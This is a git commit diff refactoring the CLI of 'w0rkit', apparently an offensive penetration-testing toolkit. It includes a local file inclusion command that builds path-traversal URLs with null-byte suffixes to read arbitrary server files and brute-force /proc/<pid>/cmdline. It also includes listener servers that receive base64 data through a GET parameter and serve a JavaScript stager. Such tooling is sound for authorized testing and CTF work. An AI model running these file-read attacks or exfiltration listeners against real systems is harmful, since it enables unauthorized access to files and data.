2f646e726fbf7eeb073d7bae774c913b8e27dee1
jarviscodes <cedric.sambre@protonmail.ch>
2023-05-10 22:31:18 +0200

    Large refactoring overhaul

--- w0rkit/cli.py
+++ w0rkit/cli.py
@@ -4,6 +4,8 @@ import requests
 import io
 import zipfile
 
+from w0rkit.web.web_modes import SimpleMode, Base64Mode
+
 
 VERSION = "0.0.1"
 
@@ -32,16 +34,19 @@ def zip_decoder(response, noerr):
         with zipfile.ZipFile(io.BytesIO(response.content)) as zip_content:
             for zipinfo in zip_content.infolist():
                 with zip_content.open(zipinfo) as unzipped_file:
-                    yield zipinfo.filename, unzipped_file.read().decode('utf-8')
+                    yield zipinfo.filename, unzipped_file.read().decode("utf-8")
     except zipfile.BadZipfile:
         # Show error only if not bruteforcing.
         if not noerr:
-            click.secho(f"{Fore.LIGHTYELLOW_EX}[LFI] {Fore.LIGHTRED_EX} Decoder failed. Either a 404 or you're using an incorrect decoder (ZIP)")
+            click.secho(
+                f"{Fore.LIGHTYELLOW_EX}[LFI] {Fore.LIGHTRED_EX} Decoder failed. Either a 404 or you're using an incorrect decoder (ZIP)"
+            )
 
 
 def base64_decoder(response, noerr):
     print("Not implemented yet :(")
     exit()
+
 
 def no_decoder(response, noerr):
     yield "raw", response.text
@@ -58,18 +63,42 @@ def handle_lfi_request(target, decoder, noerr=False):
         else:
             decode_func = no_decoder
         for filename, result in decode_func(resp, noerr):
-            click.secho(f"{Fore.LIGHTYELLOW_EX}[LFI] {Fore.WHITE}Found: {Fore.LIGHTCYAN_EX}{filename}")
+            click.secho(
+                f"{Fore.LIGHTYELLOW_EX}[LFI] {Fore.WHITE}Found: {Fore.LIGHTCYAN_EX}{filename}"
+            )
             click.secho(f"{Fore.WHITE}{result}")
-            click.secho("------------------------------------------------------------------------------")
-
+            click.secho(
+                "------------------------------------------------------------------------------"
+            )
 
 
 @lfi.command()
-@click.option("-i", "--injectable", help="The full target where the LFI is present. (ex. http://vuln.site/?download=)", required=True)
-@click.option("--filter-mode", help="Specify here if the target is somehow filtering injection. (Current options: 'spf')")
-@click.option("-s", "--suffix", help="Specify the suffix to be appended to the LFI payload. (e.g.: %00.pdf)", default="")
-@click.option("--repeat-prefix", help="Specify how many times to repeat injection characters. default = 5 (enough to traverse out of most default webroots)", default=5, type=click.types.INT)
-@click.option("--decoder", help="Use response decoder (e.g. zip) if the server returns the contents as something unexpected.")
+@click.option(
+    "-i",
+    "--injectable",
+    help="The full target where the LFI is present. (ex. http://vuln.site/?download=)",
+    required=True,
+)
+@click.option(
+    "--filter-mode",
+    help="Specify here if the target is somehow filtering injection. (Current options: 'spf')",
+)
+@click.option(
+    "-s",
+    "--suffix",
+    help="Specify the suffix to be appended to the LFI payload. (e.g.: %00.pdf)",
+    default="",
+)
+@click.option(
+    "--repeat-prefix",
+    help="Specify how many times to repeat injection characters. default = 5 (enough to traverse out of most default webroots)",
+    default=5,
+    type=click.types.INT,
+)
+@click.option(
+    "--decoder",
+    help="Use response decoder (e.g. zip) if the server returns the contents as something unexpected.",
+)
 def interrogate(injectable, filter_mode, suffix, repeat_prefix, decoder):
     injection_char = lfi_modes_to_chars.get("default")
     if filter_mode:
@@ -82,7 +111,10 @@ def interrogate(injectable, filter_mode, suffix, repeat_prefix, decoder):
 
     try:
         while True:
-            click.secho(f"{Fore.LIGHTYELLOW_EX}[LFI] {Fore.WHITE} Enter Filepath (from : /) {Style.RESET_ALL}", nl=False)
+            click.secho(
+                f"{Fore.LIGHTYELLOW_EX}[LFI] {Fore.WHITE} Enter Filepath (from : /) {Style.RESET_ALL}",
+                nl=False,
+            )
             filepath = input()
 
             # Linux Proc BF!
@@ -95,7 +127,9 @@ def interrogate(injectable, filter_mode, suffix, repeat_prefix, decoder):
                         target = f"{injectable}{injection_prefix}/proc/{procid}/cmdline"
                         handle_lfi_request(target, decoder, noerr=True)
                 except Exception as ex:
-                    click.secho(f"{Fore.LIGHTRED_EX} [LPBF] Invalid path bruteforce range specified. try: 'lpbf:1,1000' for proc/1 to proc/1000")
+                    click.secho(
+                        f"{Fore.LIGHTRED_EX} [LPBF] Invalid path bruteforce range specified. try: 'lpbf:1,1000' for proc/1 to proc/1000"
+                    )
             else:
                 # Prepare full url
                 target = f"{injectable}{injection_prefix}{filepath}{suffix}"
@@ -107,43 +141,71 @@ def interrogate(injectable, filter_mode, suffix, repeat_prefix, decoder):
 
 
 @web.command()
-@click.option("-l", "--listen_address", help="Address the server should listen on.", required=True)
+@click.option(
+    "-l", "--listen_host", help="Address the server should listen on.", required=True
+)
 @click.option("-p", "--listen_port", help="Port to listen on.", required=True)
-@click.option("-s", "--stager", is_flag=True, default=False, help="Enable the JS static web server")
-def simple(listen_address, listen_port, stager):
-    from w0rkit.web.simple_mode import app
-    app.config['STAGER_ENABLED'] = stager
-
-    showmode("Simple", listen_address, listen_port)
+@click.option(
+    "-s",
+    "--stager",
+    is_flag=True,
+    default=False,
+    help="Enable the JS static web server",
+)
+@click.option(
+    "-r", "--stager_dir", help="Location for the stager to look for static files."
+)
+def simple(listen_host, listen_port, stager, stager_dir):
     click.secho(
-        f"{Fore.CYAN}Stager: {f'{Fore.LIGHTGREEN_EX}ON' if stager else f'{Fore.LIGHTRED_EX}OFF'}{Style.RESET_ALL}")
-    app.run(host=listen_address, port=listen_port)
+        f"{Fore.CYAN}Stager: {f'{Fore.LIGHTGREEN_EX}ON' if stager else f'{Fore.LIGHTRED_EX}OFF'}{Style.RESET_ALL}"
+    )
+    app = SimpleMode(
+        listen_host=listen_host,
+        listen_port=listen_port,
+        stager=stager,
+        stager_dir=stager_dir,
+    )
+    app.run()
 
 
 @web.command()
-@click.option("-l", "--listen_address", help="Address the server should listen on.", required=True)
+@click.option(
+    "-l", "--listen_host", help="Address the server should listen on.", required=True
+)
 @click.option("-p", "--listen_port", help="Port to listen on.", required=True)
-@click.option("-m", "--magic_param", help="The GET parameter containing your base64 data.")
-@click.option("-s", "--stager", is_flag=True, default=False, help="Enable the JS static web server")
-def b64d(listen_address, listen_port, magic_param, stager):
-    from w0rkit.web.simple_b64 import app
-    if not magic_param:
-        click.secho(f"{Fore.LIGHTYELLOW_EX}No magic param specified (-m)! Defaulting to '?q='{Style.RESET_ALL}")
-        magic_param = "q"
-
-    app.config['MAGIC_PARAM'] = magic_param
-    app.config['STAGER_ENABLED'] = stager
-
-    showmode("B64Decoder <3", listen_address, listen_port, magic_param=magic_param)
-    click.secho(f"{Fore.CYAN}Stager: {f'{Fore.LIGHTGREEN_EX}ON' if stager else f'{Fore.LIGHTRED_EX}OFF'}{Style.RESET_ALL}")
-
-    app.run(host=listen_address, port=listen_port)
+@click.option(
+    "-m", "--magic_param", help="The GET parameter containing your base64 data."
+)
+@click.option(
+    "-s",
+    "--stager",
+    is_flag=True,
+    default=False,
+    help="Enable the JS static web server",
+)
+@click.option(
+    "-r", "--stager_dir", help="Location for the stager to look for static files."
+)
+def b64d(listen_host, listen_port, magic_param, stager, stager_dir):
+    click.secho(
+        f"{Fore.CYAN}Stager: {f'{Fore.LIGHTGREEN_EX}ON' if stager else f'{Fore.LIGHTRED_EX}OFF'}{Style.RESET_ALL}"
+    )
+    app = Base64Mode(
+        magic_param=magic_param,
+        listen_host=listen_host,
+        listen_port=listen_port,
+        stager=stager,
+        stager_dir=stager_dir,
+    )
+    app.run()
 
 
 def showmode(mode, host, port, **kwargs):
-    click.secho(f"{Fore.LIGHTYELLOW_EX}{mode} {Fore.LIGHTCYAN_EX}mode. Running on {Fore.WHITE}{host}:{port}{Style.RESET_ALL}")
+    click.secho(
+        f"{Fore.LIGHTYELLOW_EX}{mode} {Fore.LIGHTCYAN_EX}mode. Running on {Fore.WHITE}{host}:{port}{Style.RESET_ALL}"
+    )
 
     # Magic param set?
-    magic_param = kwargs.get('magic_param', None)
+    magic_param = kwargs.get("magic_param", None)
     if magic_param:
         click.secho(f"{Fore.LIGHTCYAN_EX}Checking parameter: {Fore.WHITE}{magic_param}")
